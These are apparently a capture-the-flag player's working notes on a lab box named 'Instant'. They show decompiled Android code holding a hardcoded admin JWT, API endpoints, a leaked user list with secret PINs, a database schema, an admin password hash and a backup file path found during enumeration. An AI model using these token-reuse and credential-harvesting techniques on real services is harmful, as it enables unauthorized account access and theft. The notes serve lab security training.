/home/kali/Downloads/instant/res/xml
2 subdomains:
mywalletv1.instant.htb
swagger-ui.instant.htb

public class AdminActivities {  
    private String TestAdminAuthorization() {  
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1

"http://mywalletv1.instant.htb/api/v1/view/profile"

this token api is a JWT
![[Pasted image 20250127133017.png]]


response:
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}

register:
public void register(String str, String str2, String str3, String str4) {  
        JsonObject jsonObject = new JsonObject();  
        jsonObject.addProperty("username", str);  
        jsonObject.addProperty(NotificationCompat.CATEGORY_EMAIL, str2);  
        jsonObject.addProperty("password", str3);  
        jsonObject.addProperty("pin", str4);  
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/register").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3

login for default user:
jsonObject.addProperty("username", str);  
jsonObject.addProperty("password", str2);  
new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/login").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4


transactions:
public void sendFunds(String str, String str2, String str3, String str4, String str5) {  
        JsonObject jsonObject = new JsonObject();  
        jsonObject.addProperty("receiver", str);  
        jsonObject.addProperty("amount", str2);  
        jsonObject.addProperty("note", str3);  
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/initiate/transaction").addHeader("Authorization", str4).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));  
    }
    
GET /api/v1/admin/list/users HTTP/1.1
{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"},{"email":"test@example.com","role":"instantian","secret_pin":12345,"status":"active","username":"testuser","wallet_id":"35631fa8-61d5-4131-b7dd-8ee0d2bfc25f"}]}


active listen on 8888 8808 ports its our 2 subdomains apps

 --> Found interesting column names in wallet_users (output limit 10)                             
CREATE TABLE wallet_users (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        wallet_id VARCHAR, 
        password VARCHAR, 
        create_date VARCHAR, 
        secret_pin INTEGER, 
        role VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email), 
        UNIQUE (wallet_id)
)
ADMIN PASS pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
but cracking this take too many time 

next findings its backup file:
/opt/backups/Solar-PuTTY/sessions-backup.dat
